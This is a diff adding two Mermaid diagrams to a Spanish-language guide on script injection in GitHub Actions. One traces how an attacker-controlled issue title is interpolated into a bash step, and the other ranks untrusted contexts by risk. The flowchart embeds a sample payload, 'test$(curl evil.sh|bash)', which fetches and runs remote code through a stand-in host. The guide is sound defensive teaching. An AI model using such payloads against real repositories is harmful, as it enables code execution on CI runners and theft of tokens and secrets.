@@ -14,6 +14,33 @@ Cuando GitHub Actions procesa un workflow, las expresiones `${{ }}` se resuelven
 
 El flujo de evaluación es el siguiente: GitHub expande `${{ github.event.issue.title }}` → el resultado se escribe literalmente en el script → bash ejecuta el script con ese texto ya en él. No hay ninguna capa de sanitización entre la expresión y el shell.
 
+```mermaid
+flowchart TD
+    A[/Evento externo\nissue, PR, comment/] --> B["Valor controlado\npor atacante\n'test$(curl evil.sh|bash)'"]
+    B --> C["GitHub expande\n\${{ github.event.issue.title }}\n→ texto literal incrustado"]
+    C --> D["Script de bash\nrecibe el texto\nya expandido"]
+    D --> E{{"¿Contiene\nmetacaracteres\n$(), \`;, &&, |?"}}
+    E -->|No| F(["Ejecución\nlegítima"])
+    E -->|Sí| G["Bash interpreta\ncomandos\narbitrarios"]
+    G --> H["Exfiltración\nde GITHUB_TOKEN\nu otros secrets"]
+
+    classDef root      fill:#1f2328,color:#fff,stroke:#444,font-weight:bold
+    classDef primary   fill:#0969da,color:#fff,stroke:#0550ae
+    classDef secondary fill:#2da44e,color:#fff,stroke:#1a7f37
+    classDef danger    fill:#cf222e,color:#fff,stroke:#a40e26
+    classDef neutral   fill:#e6edf3,color:#1f2328,stroke:#d0d7de
+    classDef warning   fill:#9a6700,color:#fff,stroke:#7d4e00
+
+    class A neutral
+    class B,C warning
+    class D primary
+    class E warning
+    class F secondary
+    class G,H danger
+```
+
+*Anatomía del ataque: la interpolación ocurre antes del shell, eliminando cualquier posibilidad de escape automático.*
+
 > [CONCEPTO] La expresión `${{ }}` es una sustitución de texto en tiempo de compilación del workflow, no un paso en tiempo de ejecución de bash. Por eso no existe "escaping automático" para valores que van dentro de `run:`.
 
 ## Contextos no confiables
@@ -97,6 +124,26 @@ Los siguientes vectores están ordenados de mayor a menor frecuencia en vulnerab
 | `github.event.pull_request.title` | `pull_request` | Fork owner | Bajo* |
 
 *`pull_request` sin `_target` corre sin secrets del repo base, lo que limita el impacto pero no elimina el riesgo de exfiltrar datos del runner o el GITHUB_TOKEN de solo lectura.
+
+```mermaid
+quadrantChart
+    title Vectores de script injection — Controllability vs Impact
+    x-axis "Control del atacante (bajo → alto)"
+    y-axis "Impacto potencial (bajo → alto)"
+    quadrant-1 Crítico
+    quadrant-2 Alto riesgo controlado
+    quadrant-3 Bajo riesgo
+    quadrant-4 Riesgo por privilegios
+    github.event.pull_request.body + prt: [0.85, 0.92]
+    github.head_ref + prt: [0.80, 0.88]
+    github.event.issue.title: [0.75, 0.65]
+    github.event.comment.body: [0.70, 0.60]
+    github.event.review.body: [0.50, 0.45]
+    github.event.inputs.*: [0.45, 0.40]
+    github.event.pull_request.title: [0.65, 0.25]
+```
+
+*Distribución de vectores de inyección: los contextos combinados con `pull_request_target` (prt) concentran el mayor riesgo por su acceso a secrets del repo base.*
 
 ## Buenas y malas prácticas
 
